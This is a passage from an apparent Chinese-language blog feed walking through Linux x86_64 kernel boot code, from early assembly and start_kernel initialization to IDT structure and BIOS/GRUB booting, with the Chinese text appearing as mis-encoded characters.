<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// ä¿®å¤é‡è½½ gdt ldt</span><br><span class="line">call	startup_64_setup_env</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">call	__startup_64</span><br><span class="line">    // ç¡®è®¤åŠ è½½åç§» - ç”± kaslr å¯¼è‡´</span><br><span class="line">    // è¿™é‡Œçš„ _text = __START_KERNEL</span><br><span class="line">    // #define _START_KERNEL    (__START_KERNEL_map + __PHYSICAL_START)</span><br><span class="line">    // #define __PHYSICAL_START  ALIGN(CONFIG_PHYSICAL_START, CONFIG_PHYSICAL_ALIGN)</span><br><span class="line">    load_delta = physaddr - (unsigned long)(_text - __START_KERNEL_map);</span><br><span class="line">    // ä¿®æ­£é¡µè¡¨åŸºåœ°å€</span><br><span class="line">    pgd = fixup_pointer(&amp;early_top_pgt, physaddr);</span><br><span class="line">    pmd = fixup_pointer(level2_fixmap_pgt, physaddr);</span><br><span class="line">    pud = fixup_pointer(&amp;level3_kernel_pgt, physaddr);</span><br><span class="line"></span><br><span class="line">// åˆæœŸé¡µè¡¨æ˜ å°„</span><br><span class="line">addq	$(early_top_pgt - __START_KERNEL_map), %rax</span><br><span class="line">jmp 1f</span><br><span class="line"></span><br><span class="line">// è®¾ç½®ç‰©ç†åœ°å€</span><br><span class="line">movq	%rcx, %cr4</span><br><span class="line"></span><br><span class="line">/* Setup early boot stage 4-/5-level pagetables. */</span><br><span class="line">addq	phys_base(%rip), %rax</span><br><span class="line"></span><br><span class="line">// é‡æ–°åŠ è½½ GDT</span><br><span class="line">lgdt	early_gdt_descr(%rip)</span><br><span class="line"></span><br><span class="line">// è®¾ç½® åˆå§‹åŒ–æ ˆ</span><br><span class="line">movq initial_stack(%rip), %rsp</span><br><span class="line"></span><br><span class="line">// è®¾ç½® IDT</span><br><span class="line">call	early_setup_idt</span><br><span class="line"></span><br><span class="line">// æ£€æŸ¥ CPU å¹¶å¯¹ cr0 å¯„å­˜å™¨ç½®ä½</span><br><span class="line">movl	$0x80000001, %eax</span><br><span class="line">cpuid</span><br><span class="line">movl	$CR0_STATE, %eax</span><br><span class="line">/* Make changes effective */</span><br><span class="line">movq	%rax, %cr0</span><br><span class="line"></span><br><span class="line">// ä¿å­˜å®æ¨¡å¼ä¸‹ boot paramï¼Œå¹¶è·³è½¬åˆ° c ä»£ç </span><br><span class="line">movq    initial_code(%rip),%rax</span><br><span class="line">pushq    $0</span><br><span class="line">pushq    $__KERNEL_CS</span><br><span class="line">pushq    %rax</span><br><span class="line">lretq</span><br></pre></td></tr></table></figure>
<h3 id="C-å‡½æ•°æ£€æŸ¥"><a href="#C-å‡½æ•°æ£€æŸ¥" class="headerlink" title="C å‡½æ•°æ£€æŸ¥"></a>C å‡½æ•°æ£€æŸ¥</h3><p>ç°åœ¨æ¥åˆ° <code>/arch/x86/kernel/head64.c</code><br>è¿™é‡Œçš„ initial_code æ˜¯ <code>X86_64_start_kernel</code>ï¼Œå¤§è‡´ä»£ç å¦‚ä¸‹</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// æ£€æŸ¥æ¨¡å—è™šæ‹Ÿåœ°å€ä¸å†…æ ¸è™šæ‹Ÿåœ°å€ä¹‹é—´çš„å…³ç³»</span><br><span class="line">BUILD_BUG_ON(MODULES_VADDR &lt; __START_KERNEL_map);</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">// å­˜å‚¨å¤šCPUä¸­çš„ cr4 çš„ shadow copyï¼Œå› ä¸ºä¸Šä¸‹æ–‡åˆ‡æ¢å¯èƒ½ä¼šä¿®æ”¹ cr4 ä¸­çš„ä½</span><br><span class="line">cr4_init_shadow();</span><br><span class="line"></span><br><span class="line">// é‡ç½®å…¨å±€é¡µç›®å½•é¡¹ä»¥åŠæ¸…ç©º BSS æ®µ</span><br><span class="line">reset_early_page_tables();</span><br><span class="line">clear_bss();</span><br><span class="line">clear_page(init_top_pgt);</span><br></pre></td></tr></table></figure>
<p><strong>åˆæœŸä¸­æ–­ä¸å¼‚å¸¸å¤„ç†</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">idt_setup_early_handler();</span><br></pre></td></tr></table></figure>
<p>ä¸­æ–­æ˜¯ç”±ç¡¬ä»¶æˆ–è€…è½¯ä»¶å‘å‡ºçš„äº‹ä»¶ï¼ŒCPU æ¥æ”¶äº‹ä»¶åä¼šå°†æ§åˆ¶æµè½¬åˆ° <strong>ä¸­æ–­å¤„ç†ç¨‹åº</strong>ä¸­ï¼Œä¸€èˆ¬ä¸­æ–­åˆ†æˆä¸‰ç±»ï¼š</p>
<ul>
<li>ç¡¬ä»¶ä¸­æ–­ï¼šç¡¬ä»¶æœ‰ä»»ä½•äº‹ä»¶å‘ç”Ÿæ—¶</li>
<li>è½¯ä»¶ä¸­æ–­ï¼šè½¯ä»¶éœ€è¦å†…æ ¸æä¾›åŠŸèƒ½æ—¶ï¼Œä¸€èˆ¬æ˜¯ç³»ç»Ÿè°ƒç”¨</li>
<li>å¼‚å¸¸ï¼šCPU æ£€æµ‹åˆ°é”™è¯¯æ—¶ï¼Œå¦‚é™¤é›¶é”™è¯¯æˆ–è€…ä¸å­˜åœ¨çš„å†…å­˜é¡µ</li>
</ul>
<p>é€šå¸¸ä½¿ç”¨æ•°å­—è¡¨ç¤ºå¼‚å¸¸å’Œä¸­æ–­ç±»å‹ï¼Œç§°ä¹‹ä¸º<strong>å‘é‡å·</strong>ï¼Œä¸€èˆ¬æ¥è¯´å‰32ä½è¡¨ç¤ºå¼‚å¸¸ï¼Œå…¶ä½™è¡¨ç¤ºç”¨æˆ·è‡ªå®šä¹‰çš„ä¸­æ–­</p>
<p>ä¸­æ–­æ•°æ®å¤„ç†çš„ç»“æ„ç±»ä¼¼äºå…¨å±€æè¿°ç¬¦è¡¨ GDTï¼Œä¹Ÿå­˜åœ¨ä¸­æ–­æè¿°ç¬¦è¡¨<code>IDT</code>ï¼Œä¸­æ–­æè¿°ç¬¦è¡¨å¯„å­˜å™¨ <code>idtr</code>ï¼Œä»¥åŠåŠ è½½åŸºåœ°å€çš„æ“ä½œæŒ‡ä»¤ <code>lidt</code></p>
<p>å³å¦‚æœè§¦å‘ä¸­æ–­ï¼Œåˆ™å°†ä¼šä»ä» <code>idr</code> ä¸­æ‰¾åˆ° <code>IDT</code> çš„åŸºå€ï¼Œéšåé€šè¿‡å‘é‡å·æœç´¢æè¿°ç¬¦çš„èµ·å§‹åœ°å€ï¼Œé¢å¤–çš„ï¼Œä¸€èˆ¬å°†IDTä¸­çš„æ¯ä¸€é¡¹ç§°ä¹‹ä¸º <code>gate</code> å³é—¨</p>
<p>64ä½ä¸‹ gate çš„ç»“æ„æ˜¯</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">127                                                                             96</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                                                               |</span><br><span class="line">|                                Reserved                                       |</span><br><span class="line">|                                                                               |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">95                                                                              64</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                                                               |</span><br><span class="line">|                               Offset 63..32                                   |</span><br><span class="line">|                                                                               |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">63                               48 47      46  44   42    39             34    32</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                  |       |  D  |   |     |      |   |   |     |</span><br><span class="line">|       Offset 31..16              |   P   |  P  | 0 |Type |0 0 0 | 0 | 0 | IST |</span><br><span class="line">|                                  |       |  L  |   |     |      |   |   |     |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">31                                   15 16                                      0</span><br><span class="line"> --------------------------------------------------------------------------------</span><br><span class="line">|                                      |                                        |</span><br><span class="line">|          Segment Selector            |                 Offset 15..0           |</span><br><span class="line">|                                      |                                        |</span><br><span class="line"> --------------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
<p><strong>rest of prepare</strong></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// è·å–å®æ¨¡å¼ boot_paramsï¼Œä¸¤é¡¹å·¥ä½œ</span><br><span class="line">// å¤åˆ¶å†…å®¹ ä¸ è·å–å‘½ä»¤è¡Œ</span><br><span class="line">copy_bootdata(__va(real_mode_data));</span><br><span class="line"></span><br><span class="line">// åŠ è½½å¤„ç†å™¨å¾®ä»£ç </span><br><span class="line">load_ucode_bsp();</span><br><span class="line"></span><br><span class="line">// å°† init_top_pgt æœ€åä¸€é¡¹è®¾ç½®ä¸ºå†…æ ¸é«˜åœ°å€æ˜ å°„</span><br><span class="line">init_top_pgt[511] = early_top_pgt[511];</span><br></pre></td></tr></table></figure>

<h2 id="Start-kernel"><a href="#Start-kernel" class="headerlink" title="Start_kernel"></a>Start_kernel</h2><p>æ­¤å‡½æ•°çš„ä¸»è¦ç›®çš„æ˜¯å®Œæˆå†…æ ¸åˆå§‹åŒ–å¹¶å¯åŠ¨ 1 å·è¿›ç¨‹</p>
<h3 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h3><p>æºç å…¥å£ï¼š<code>init/main.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// è®¾ç½® canary ä»¥æ£€æµ‹æ ˆæº¢å‡º</span><br><span class="line">set_task_stack_end_magic(&amp;init_task);</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–æ§åˆ¶ç»„ä¿¡æ¯ä»¥åŠæ‰€æœ‰éœ€è¦ early init çš„å­ç³»ç»Ÿ</span><br><span class="line">cgroup_init_early();</span><br><span class="line"></span><br><span class="line">// æ¿€æ´»ç¬¬ä¸€ä¸ªCPUï¼Œå¹¶è®¾ç½®çŠ¶æ€</span><br><span class="line">boot_cpu_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–é¡µåœ°å€</span><br><span class="line">page_address_init();</span><br><span class="line"></span><br><span class="line">// æ‰“å° å†…æ ¸ç‰ˆæœ¬ä¿¡æ¯</span><br><span class="line">// ğŸŒ° Linux version 4.15.8 (simple@vps-simple) (gcc version 4.8.5 20150623 (Red Hat 4.8.5-16) (GCC)) #19 SMP Mon Mar 19 18:50:28 CST 2018</span><br><span class="line">pr_notice(&quot;%s&quot;, linux_banner);</span><br><span class="line"></span><br><span class="line">// ä¾èµ–äºä½“ç³»ç»“æ„çš„åˆå§‹åŒ–</span><br><span class="line">setup_arch(&amp;command_line);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>ä½“ç³»æ¶æ„åˆå§‹åŒ–</strong><br>æºç å…¥å£ï¼š<code>/arch/x86/kernel/setup.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// æ‰“å°å‘½ä»¤è¡Œ</span><br><span class="line">// ğŸŒ° Command line: root=/dev/ram rw console=ttyS0 oops=panic panic=1 kaslr</span><br><span class="line">printk(KERN_INFO &quot;Command line: %s\n&quot;, boot_command_line);</span><br><span class="line"></span><br><span class="line">// æ£€æµ‹ç³»ç»Ÿæ˜¯å¦æ”¯æŒ OLPC</span><br><span class="line">olpc_ofw_detect();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–è°ƒè¯•åŠŸèƒ½</span><br><span class="line">idt_setup_early_traps();</span><br></pre></td></tr></table></figure>
<p>å½“ä¸­æ–­å‘ç”Ÿåï¼Œæ ˆå†…çš„æ ¼å¼æ˜¯ï¼š</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">    +-----------------------+</span><br><span class="line">    |                       |</span><br><span class="line">+40 |         SS            |</span><br><span class="line">+32 |         RSP           |</span><br><span class="line">+24 |        RFLAGS         |</span><br><span class="line">+16 |         CS            |</span><br><span class="line">+8  |         RIP           |</span><br><span class="line"> 0  |       Error Code      | &lt;---- rsp</span><br><span class="line">    |                       |</span><br><span class="line">    +-----------------------+</span><br></pre></td></tr></table></figure>

<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// æœé›† CPU åŠä¾›åº”å•†ä¿¡æ¯</span><br><span class="line">early_cpu_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–æ—©æœŸ ioremap</span><br><span class="line">early_ioremap_init();</span><br></pre></td></tr></table></figure>
<p>ä¸€èˆ¬ä¸è®¾å¤‡å®ç°é€šä¿¡æœ‰ä¸¤ç§æ–¹å¼ï¼š</p>
<ul>
<li>I&#x2F;O ç«¯å£ï¼šé€šè¿‡ outb&#x2F;inb æŒ‡ä»¤å®ç°</li>
<li>è®¾å¤‡å†…å­˜ï¼šå°†è®¾å¤‡å†…å­˜æ˜ å°„åˆ°å†…æ ¸åœ°å€ç©ºé—´ï¼Œå³å½“ CPU è¯»å–ç‰©ç†å†…å­˜æ—¶ï¼Œèƒ½å¤Ÿè¯»å–åˆ° I&#x2F;O è®¾å¤‡çš„ç‰©ç† RAW åŒºåŸŸ</li>
</ul>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// è·å–æ ¹è®¾å¤‡çš„ä¸»æ¬¡è®¾å¤‡å·</span><br><span class="line">// ä¸»è®¾å¤‡å·è¯†åˆ«é©±åŠ¨ï¼Œæ¬¡è®¾å¤‡å·è¡¨ç¤ºè®¾å¤‡</span><br><span class="line">ROOT_DEV = old_decode_dev(boot_params.hdr.root_dev);</span><br><span class="line"></span><br><span class="line">// è®¾ç½®æ˜¾ç¤ºå‚æ•°</span><br><span class="line">screen_info = boot_params.screen_info;</span><br><span class="line">edid_info = boot_params.edid_info;</span><br><span class="line">saved_video_mode = boot_params.hdr.vid_mode;</span><br><span class="line">bootloader_type = boot_params.hdr.type_of_loader;</span><br><span class="line">if ((bootloader_type &gt;&gt; 4) == 0xe) &#123;</span><br><span class="line">    bootloader_type &amp;= 0xf;</span><br><span class="line">    bootloader_type |= (boot_params.hdr.ext_loader_type+0x10) &lt;&lt; 4;</span><br><span class="line">&#125;</span><br><span class="line">bootloader_version  = bootloader_type &amp; 0xf;</span><br><span class="line">bootloader_version |= boot_params.hdr.ext_loader_ver &lt;&lt; 4;</span><br><span class="line"></span><br><span class="line">// å†…å­˜ä¿ç•™</span><br><span class="line">early_reserve_memory();</span><br><span class="line"></span><br><span class="line">// å†…å­˜æ˜ å°„ï¼Œæ‰“å°ä¿¡æ¯</span><br><span class="line">//  ğŸŒ°  0.000000] e820: BIOS-provided physical RAM map:</span><br><span class="line">// [    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable</span><br><span class="line">e820__memory_setup();</span><br><span class="line"></span><br><span class="line">// å¤åˆ¶ BIOS ç£ç›˜è®¾å¤‡ä¿¡æ¯</span><br><span class="line">copy_edd();</span><br><span class="line"></span><br><span class="line">// å†…å­˜æè¿°ç¬¦åˆå§‹åŒ– åŠ ä»£ç /æ•°æ®/BSS èµ„æºåˆå§‹åŒ–</span><br><span class="line">setup_initial_init_mm(_text, _etext, _edata, (void *)_brk_end);</span><br><span class="line">code_resource.start = __pa_symbol(_text);</span><br><span class="line">code_resource.end = __pa_symbol(_etext)-1;</span><br><span class="line">rodata_resource.start = __pa_symbol(__start_rodata);</span><br><span class="line">rodata_resource.end = __pa_symbol(__end_rodata)-1;</span><br><span class="line">data_resource.start = __pa_symbol(_sdata);</span><br><span class="line">data_resource.end = __pa_symbol(_edata)-1;</span><br><span class="line">bss_resource.start = __pa_symbol(__bss_start);</span><br><span class="line">bss_resource.end = __pa_symbol(__bss_stop)-1;</span><br><span class="line"></span><br><span class="line">// é…ç½® NX</span><br><span class="line">x86_configure_nx();</span><br><span class="line"></span><br><span class="line">// è§£æå‘½ä»¤è¡Œå¹¶åŸºäºåˆ›å»ºä¸åŒçš„æœåŠ¡ï¼Œå¦‚ </span><br><span class="line">parse_early_param();</span><br><span class="line"></span><br><span class="line">//å†…å­˜è§£æ</span><br><span class="line">/* update the e820_saved too */</span><br><span class="line">e820_reserve_setup_data();</span><br><span class="line">finish_e820_parsing();</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">e820_add_kernel_range();</span><br><span class="line">trim_bios_range(void);</span><br><span class="line">max_pfn = e820_end_of_ram_pfn();</span><br><span class="line">early_reserve_e820_mpc_new();</span><br><span class="line"></span><br><span class="line">//DMIæ‰«æï¼Œé€šè¿‡ Desktop Management Interface è·å–ä¿¡æ¯</span><br><span class="line">dmi_setup();</span><br><span class="line"></span><br><span class="line">// è§£æ SMP é…ç½®</span><br><span class="line">find_smp_config();</span><br><span class="line"></span><br><span class="line">// é¢å¤–çš„æ—©æœŸå†…å­˜åˆå§‹åŒ–ï¼Œä¸»è¦ç”¨æ¥åˆ†é…é¡µè¡¨ç¼“å†²åŒºï¼Œæ”¾ç½®åœ¨ brk åŒºåŸŸå†…</span><br><span class="line">early_alloc_pgt_buf();</span><br><span class="line"></span><br><span class="line">// åˆ†é…æ—¥å¿—ç¼“å†²åŒº</span><br><span class="line">setup_log_buf(1);</span><br><span class="line"></span><br><span class="line">// ä¸º DMA åˆ†é…åŒºåŸŸ</span><br><span class="line">dma_contiguous_reserve(max_pfn_mapped &lt;&lt; PAGE_SHIFT);</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– sparse memoryï¼Œç”¨äº NUMA ç³»ç»Ÿå°†å†…å­˜åŒºåŸŸåˆ’åˆ†ä¸ºä¸åŒçš„å†…å­˜åº“</span><br><span class="line">x86_init.paging.pagetable_init();</span><br><span class="line"></span><br><span class="line">// æ˜ å°„ vsyscallï¼Œä¸º vsyscall æ˜ å°„å†…å­˜ç©ºé—´ï¼Œæä¾›å¯¹äºæŸäº›ç³»ç»Ÿè°ƒç”¨çš„å¿«é€Ÿè®¿é—®</span><br><span class="line">map_vsyscall();</span><br><span class="line"></span><br><span class="line">// è·å– SMP é…ç½®ä¿¡æ¯</span><br><span class="line">get_smp_config();</span><br></pre></td></tr></table></figure>
<p>å›å½’ <code>main.c</code></p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// è§£æå‘½ä»¤è¡Œ</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line"></span><br><span class="line">// è·å–å¯ç”¨CPUæ•°é‡</span><br><span class="line">// ğŸŒ° setup_percpu: NR_CPUS:64 nr_cpumask_bits:64 nr_cpu_ids:1 nr_node_ids:1</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line"></span><br><span class="line">// ä¸º percpu è®¾ç½®å†…å­˜åŒºåŸŸ</span><br><span class="line">setup_per_cpu_areas();</span><br><span class="line"></span><br><span class="line">// å‡†å¤‡ smp Boot cpu</span><br><span class="line">smp_prepare_boot_cpu();</span><br><span class="line"></span><br><span class="line">// å»ºç«‹åŒºåŸŸåˆ—è¡¨</span><br><span class="line">build_all_zonelists(NULL);</span><br><span class="line"></span><br><span class="line">// è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿæ—©èµ·åˆå§‹åŒ–</span><br><span class="line">vfs_caches_init_early();</span><br><span class="line"></span><br><span class="line">// å†…å­˜ç®¡ç†å™¨åˆå§‹åŒ–</span><br><span class="line">mm_init();</span><br><span class="line"></span><br><span class="line">// è°ƒåº¦ç¨‹åºåˆå§‹åŒ–</span><br><span class="line">sched_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–åŸºç¡€æ ‘</span><br><span class="line">radix_tree_init();</span><br><span class="line"></span><br><span class="line">// RCU åˆå§‹åŒ–</span><br><span class="line">rcu_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–è·Ÿè¸ªå­ç³»ç»Ÿ</span><br><span class="line">trace_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– ä¸­æ–­å¤„ç†å­ç³»ç»Ÿ</span><br><span class="line">early_irq_init();</span><br><span class="line">init_IRQ();</span><br><span class="line">softirq_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ–æ—¶é—´å­ç³»ç»Ÿ</span><br><span class="line">init_timers();</span><br><span class="line">hrtimers_init();</span><br><span class="line">timekeeping_init();</span><br><span class="line"></span><br><span class="line">// å¯ç”¨ irq</span><br><span class="line">local_irq_enable();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– slab</span><br><span class="line">kmem_cache_init_late();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– å‘½ä»¤è¡Œ</span><br><span class="line">console_init();</span><br><span class="line"></span><br><span class="line">// pid hash table åˆå§‹åŒ–</span><br><span class="line">pid_idr_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– çº¿ç¨‹/æ ˆ ç¼“å­˜</span><br><span class="line">thread_stack_cache_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– cred</span><br><span class="line">cred_init();</span><br><span class="line"></span><br><span class="line">// ä¸º task_struct åˆ†é…ç¼“å­˜</span><br><span class="line">fork_init();</span><br><span class="line"></span><br><span class="line">// ä¸º å†…å­˜æè¿°ç¬¦åˆ†é…ç¼“å­˜</span><br><span class="line">proc_caches_init();</span><br><span class="line"></span><br><span class="line">// ä¸º vfs åˆ†é…ç¼“å­˜</span><br><span class="line">vfs_caches_init();</span><br><span class="line"></span><br><span class="line">// ä¸º procfs åˆ›å»ºæ ¹ç›®å½•</span><br><span class="line">proc_root_init();</span><br><span class="line"></span><br><span class="line">// åˆå§‹åŒ– å®‰å…¨å†…å®¹</span><br><span class="line">key_init();</span><br><span class="line">security_init();</span><br><span class="line"></span><br><span class="line">... å­ç³»ç»Ÿ</span><br><span class="line"></span><br><span class="line">// å‰©ä½™åˆå§‹åŒ–</span><br><span class="line">arch_call_rest_init();</span><br><span class="line">    - rest_init</span><br><span class="line">        // å¯åŠ¨ RCU è°ƒåº¦ç¨‹åº</span><br><span class="line">        - rcu_scheduler_starting();</span><br><span class="line">        // æ„å»º init è¿›ç¨‹å’Œ kthreadd çº¿ç¨‹</span><br><span class="line">        - pid = kernel_thread(kernel_init, NULL, CLONE_FS);</span><br><span class="line">        - pid = kernel_thread(kthreadd, NULL, CLONE_FS | CLONE_FILES);</span><br><span class="line">        // è·å– kthreadd tast_struct</span><br><span class="line">        - kthreadd_task = find_task_by_pid_ns(pid, &amp;init_pid_ns);</span><br><span class="line"></span><br><span class="line">        - æ›´æ–°ç³»ç»ŸçŠ¶æ€</span><br><span class="line">        system_state = SYSTEM_SCHEDULING;</span><br><span class="line"></span><br><span class="line">        - æ­£å¼å¯åŠ¨</span><br></pre></td></tr></table></figure>
<p><strong>SMP Prepare</strong><br>æ­¤å‡½æ•°ä¾æ—§æ˜¯ç‰¹å®šäºä½“ç³»æ¶æ„</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">// è·å–å½“å‰ CPU</span><br><span class="line">int me = smp_processor_id();</span><br><span class="line">// ä¸ºç»™å®šCPUé‡æ–°åŠ è½½ GDT</span><br><span class="line">switch_to_new_gdt(me);</span><br><span class="line"></span><br><span class="line">// å°† CPU ä¿®æ”¹ä¸ºåœ¨çº¿</span><br><span class="line">cpumask_set_cpu(me, cpu_callout_mask);</span><br><span class="line">cpu_set_state_online(me);</span><br><span class="line">native_pv_lock_init();</span><br></pre></td></tr></table></figure>
<p><strong>å»ºç«‹åŒºåŸŸåˆ—è¡¨</strong><br>æ­¤å‡½æ•°è®¾ç½®ä¼˜å…ˆåˆ†é…çš„åŒºåŸŸé¡ºåº<br>Linuxå†…æ ¸å°†ç‰©ç†å†…å­˜åˆ†æˆ nodesï¼Œå…¶ç»“æ„ä¸º pglist_data<br>æ¯ä¸€ä¸ª node è¢«åˆ†æˆå¾ˆå¤šå—ï¼Œç§°ä¹‹ä¸º zonesï¼Œç»“æ„ä¸º zone</p>
<p>æ‹¥æœ‰ä»¥ä¸‹ç±»å‹ï¼š</p>
<ul>
<li>ZONE_DMA 0-16M</li>
<li>ZONE_DMA32 ç”¨äº4Gä»¥ä¸‹DMAåŒºåŸŸçš„32ä½è®¾å¤‡</li>
<li>ZONE_NORMAL æ‰€æœ‰ 4G RAM åŒºåŸŸ x86_64</li>
<li>ZONE_HIGHMEM x86_64 ä¸å­˜åœ¨</li>
<li>ZONE_MOVABLE åŒ…å«å¯ç§»åŠ¨é¡µé¢åŒº</li>
</ul>
<p><strong>RCU</strong><br>RCU read-copy-updateï¼Œæ˜¯Linuxå†…æ ¸å®ç°çš„ä¸€ç§å¯æ‹“å±•çš„é«˜æ€§èƒ½åŒæ­¥æœºåˆ¶ï¼Œå…¶ä¸“é—¨ä¸ºå¾ˆå°‘ä¿®æ”¹çš„æ•°æ®ç»“æ„è€Œè®¾è®¡</p>
]]></content>
      <categories>
        <category>Kernel</category>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux Kernel ä¹‹ å¼€å¤©è¾Ÿåœ°</title>
    <url>/2022/05/13/Linux-Kernel-%E4%B9%8B-%E5%BC%80%E5%A4%A9%E8%BE%9F%E5%9C%B0/</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="ä»-CPU-å¼€å§‹"><a href="#ä»-CPU-å¼€å§‹" class="headerlink" title="ä» CPU å¼€å§‹"></a>ä» CPU å¼€å§‹</h2><h3 id="é€šç”µå¯åŠ¨å¤ä½"><a href="#é€šç”µå¯åŠ¨å¤ä½" class="headerlink" title="é€šç”µå¯åŠ¨å¤ä½"></a>é€šç”µå¯åŠ¨å¤ä½</h3><p>åœ¨ CPU é€šç”µåï¼Œä¼šå¯¹å†…ç½®å¯„å­˜å™¨è¿›è¡Œå¤ä½</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">IP          0xfff0</span><br><span class="line">CS selector 0xf000</span><br><span class="line">CS base     0xffff0000</span><br></pre></td></tr></table></figure>
<p>è¿™ä¹Ÿå°±æ„å‘³ç€ <code>Phsical Address = CS * 16 + IP = 0xFFFFFFF0</code></p>
<p>æ­¤åœ°ç§°ä¹‹ä¸º <strong>å¤ä½å‘é‡</strong> å³ CPU é‡ç½®åæœŸæœ›æ‰§è¡Œçš„ç¬¬ä¸€æ¡è¯­å¥çš„å†…å­˜åœ°å€ï¼Œå¯ä»¥çœ‹åˆ°ä»–ä»…åŒ…å«ç®€å•çš„è·³è½¬æŒ‡ä»¤ï¼Œå¯ä»¥ç†è§£ä¸º <code>jump _start16bit - ( . + 2)</code>ï¼Œå³è·³è½¬åˆ° BIOS</p>
<figure class="highlight console"><table><tr><td class="code"><pre><span class="line">    .section &quot;.reset&quot;, &quot;ax&quot;, %progbits</span><br><span class="line">    .code16</span><br><span class="line">.globl    _start</span><br><span class="line">_start:</span><br><span class="line">    .byte  0xe9</span><br><span class="line">    .int   _start16bit - ( . + 2 )</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<h3 id="BIOS-æœç´¢å¼•å¯¼ç¨‹åº"><a href="#BIOS-æœç´¢å¼•å¯¼ç¨‹åº" class="headerlink" title="BIOS æœç´¢å¼•å¯¼ç¨‹åº"></a>BIOS æœç´¢å¼•å¯¼ç¨‹åº</h3><p>BIOSå³åŸºæœ¬è¾“å…¥è¾“å‡ºç³»ç»Ÿï¼Œå®ƒä¸»è¦å·¥ä½œæ˜¯æ ¹æ®è®°å½•çš„å¯å¼•å¯¼è®¾å¤‡åˆ—è¡¨è¿›è¡Œæœç´¢å¯å¼•å¯¼ç¨‹åº</p>
<p>æˆ‘ä»¬å¸¸è§çš„å¯å¼•å¯¼è®¾å¤‡å°±æ˜¯ç¡¬ç›˜ï¼Œå¯¹äºç¡¬ç›˜ï¼ŒBIOSå°†ä¼šæœç´¢å…¶å¼•å¯¼æ‰‡åŒºï¼Œå¦‚æœç¡¬ç›˜å­˜åœ¨ MBR åˆ†åŒºï¼Œåˆ™å¼•å¯¼æ‰‡åŒºå­˜å‚¨åœ¨ç¬¬ä¸€ä¸ªæ‰‡åŒºçš„å‰ 446 å­—èŠ‚å¤„ï¼Œæ‰‡åŒºçš„ç»“å°¾æ˜¯ <code>0x55</code> å’Œ <code>0xaa</code>ï¼ŒBIOS é€šå¸¸æ˜¯é€šè¿‡è¿™ä¸¤ä¸ªé­”æœ¯å­—èŠ‚æ¥åˆ¤æ–­è®¾å¤‡æ˜¯å¦å¯å¼•å¯¼ã€‚</p>
<p>å¯¹äº Linux æ¥è¯´æœ‰å¾ˆå¤šçš„å¼•å¯¼ç¨‹åºï¼ŒLinux å†…æ ¸é€šè¿‡ Boot protocal å®šä¹‰å®ç°å¼•å¯¼ç¨‹åº</p>
<p><strong>ä»¥ GRUB 2 ä¸ºä¾‹</strong><br>å¸¸è§„æ¥è¯´ï¼Œå¯åŠ¨æ‰‡åŒºçš„ä»£ç æ˜¯ <code>boot.img</code>ï¼Œé€šå¸¸ä»…å æœ‰ 1 ä¸ªæ‰‡åŒºï¼Œåšå®Œå¿…è¦çš„åˆå§‹åŒ–åå°±è·³è½¬åˆ° <code>GRUB 2 core image</code> æ‰§è¡Œï¼Œå¯¹åº”çš„ä»£ç å¯ä»¥å‚ç…§ <code>diskboot.img</code>ï¼Œé€šå¸¸å­˜å‚¨åœ¨å¼•å¯¼æ‰‡åŒºä¹‹åç¬¬ä¸€ä¸ªå¯ç”¨åˆ†åŒºä¹‹å‰ï¼Œèƒ½å¤Ÿå°†å¼•å¯¼ç¨‹åºçš„ä»£ç å’Œæ–‡ä»¶åŠ è½½åˆ°ç¨‹åºä¸­ï¼Œâ€¦ï¼Œæœ€åä½¿ç”¨ GRUB <code>boot</code> å‘½ä»¤å¼•å¯¼é€‰æ‹©çš„æ“ä½œç³»ç»Ÿ</p>
